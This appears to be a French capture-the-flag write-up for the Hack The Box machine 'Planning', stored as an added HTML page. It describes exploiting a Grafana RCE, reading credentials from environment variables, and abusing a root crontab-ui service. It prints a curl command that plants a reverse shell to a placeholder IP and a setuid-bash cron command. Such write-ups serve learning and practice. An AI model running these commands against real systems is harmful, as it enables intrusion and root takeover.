@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Planning | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Planning" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="I’m definitely planning to finish this one" />
+<meta property="og:description" content="I’m definitely planning to finish this one" />
+<link rel="canonical" href="/HTB/season8/planning.html" />
+<meta property="og:url" content="/HTB/season8/planning.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-07T16:31:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Planning" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-07T16:31:00+02:00","datePublished":"2026-04-07T16:31:00+02:00","description":"I’m definitely planning to finish this one","headline":"Planning","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season8/planning.html"},"url":"/HTB/season8/planning.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Planning</h1>
+      <h2 class="project-tagline">I'm definitely planning to finish this one</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <p>On commence avec des identifiants <code class="language-plaintext highlighter-rouge">admin:0D5oT70Fq13EvB5r</code> mais on ne peut pas se connecter avec ssh avec, on ne peut pas s’en servir pour le moment.</p>
+
+<h1 id="foothold">Foothold</h1>
+
+<p>On trouve les ports 22 et 80 avec le scan nmap et, sur le site web, les pages:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"status":200,"url":"http://planning.htb/index.php"}
+{"status":200,"url":"http://planning.htb/contact.php"}
+{"status":200,"url":"http://planning.htb/detail.php"}
+{"status":200,"url":"http://planning.htb/."}
+{"status":200,"url":"http://planning.htb/about.php"}
+</code></pre></div></div>
+
+<p>La page principale propose… des cours.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260407165604.png"></span></p>
+
+<p>On teste quelques injections sql sur la bare de recherche mais rien d’apparent ne ressort.</p>
+
+<p>Bien que cela ne soit pas dans le top 1 million, il nous fallait trouver le sous-domaine <code class="language-plaintext highlighter-rouge">grafana</code>. On va donc tester ce sous-domaine. On y trouve une page de connexion et, cette fois, les identifiants fonctionnent.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260409121647.png"></span></p>
+
+<p>En haut à droite, sur le point d’interrogation, on retrouve qu’on utilise grafana 11.0</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260409122636.png"></span></p>
+
+<p>Ca tombe bien, on trouve un <a href="%5Bhttps://github.com/nollium/CVE-2024-9264%5D(https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)" class="web-link">exploit</a> pour cette version exactement. On arrive assez facilement à exploiter la RCE et obtenir un shell.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260409182728.png"></span></p>
+
+<h1 id="privilege-escalation-to-user">Privilege Escalation to user</h1>
+
+<p>On remarque avec cet accès qu’on est root mais aussi qu’il n’y a pas de flag dans les dossiers utilisateurs ni dans le dossier root. On peut donc en déduire que l’on est dans un docker et que notre utilisateur a probablement des droits intéressants. On va donc essayer d’obtenir un shell dans la bonne machine. (on voit surtout qu’on est dans un environnement docker parce que <code class="language-plaintext highlighter-rouge">/.dockerenv</code> existe).</p>
+
+<p>En listant <code class="language-plaintext highlighter-rouge">env</code> on arrive à trouver un mot de passe:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>env
+HISTCONTROL=ignorespace
+AWS_AUTH_SESSION_DURATION=15m
+HOSTNAME=7ce659d667d7
+PWD=/usr/share/grafana
+AWS_AUTH_AssumeRoleEnabled=true
+GF_PATHS_HOME=/usr/share/grafana
+AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+HOME=/usr/share/grafana
+TERM=xterm-256color
+AWS_AUTH_EXTERNAL_ID=
+SHLVL=3
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+GF_SECURITY_ADMIN_USER=enzo
+PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
+GF_PATHS_DATA=/var/lib/grafana
+GF_PATHS_LOGS=/var/log/grafana
+PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260410094724.png"></span></p>
+
+<p>On a donc des identifiants pour l’utilisateur enzo <code class="language-plaintext highlighter-rouge">enzo:RioTecRANDEntANT!</code>. On confirme quand même que l’on ne peut pas monter la partition au cas où puis on se connecte en ssh.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260410100607.png"></span></p>
+
+<h1 id="privesc-to-root">PrivEsc to root</h1>
+
+<p>On lance linpeas après avoir testé les options les plus courantes et il nous toruve rapidement les identifiants</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crontab-ui binary found at: /usr/bin/crontab-uiService: crontab-ui.service (state: active, User: root)
+  └─ Basic-Auth credentials in Environment: user='root' pwd='P4ssw0rdS0pRi0T3c'
+  └─ CRON_DB_PATH: /opt/crontabs
+  └─ Listener detected on 127.0.0.1:8000 (likely Crontab UI).
+  └─ DB dir perms: drwxr-xr-x root root
+  └─ Inspecting /opt/crontabs/crontab.db for embedded secrets in commands (zip -P / --password / pass/token/secret)...
+sed: -e expression #1, char 25: unterminated `s' command
+</code></pre></div></div>
+
+<p>En fait on a obtenu l’accès à un crontab basé sur un gui, on peut s’y connecter avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+
+<p>Et pour en abuser, on upload notre crontab malicieux</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -u root:P4ssw0rdS0pRi0T3c \
+  -X POST http://127.0.0.1:8000/save \
+  --data 'name=shell&amp;command=bash+-c+"bash+-i+&gt;%26+/dev/tcp/YOUR_IP/9001+0&gt;%261"&amp;schedule=*+*+*+*+*&amp;stopped=false'
+</code></pre></div></div>
+
+<p><a href="https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=crontab-ui#crontab-ui-alseambusher-running-as-root--web-based-scheduler-privesc" class="web-link">hacktricks</a></p>
+
+<p>On forward le port 8000 vers un port local:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 9001:localhost:8000 enzo@planning.htb
+</code></pre></div></div>
+
+<p>On voit que l’on a bien une page de connexion sur <code class="language-plaintext highlighter-rouge">http://localhost:9001</code>.</p>
+
+<p>On ajoute un cron job:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp /bin/bash /tmp/rootshell &amp;&amp; chmod 6777 /tmp/rootshell
+</code></pre></div></div>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260410121944.png"></span></p>
+
+<p>Et enfin, sur la machine, en ssh, on utilise le shell nouvellement créé.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/tmp/rootshell -p
+</code></pre></div></div>
+
+<p>Il faut savoir que l’on peut forcer le lancement du script sur le site directement. Et voilà, notre root shell.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260410122717.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/planning%20images/Pasted%20image%2020260410122824.png"></span></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
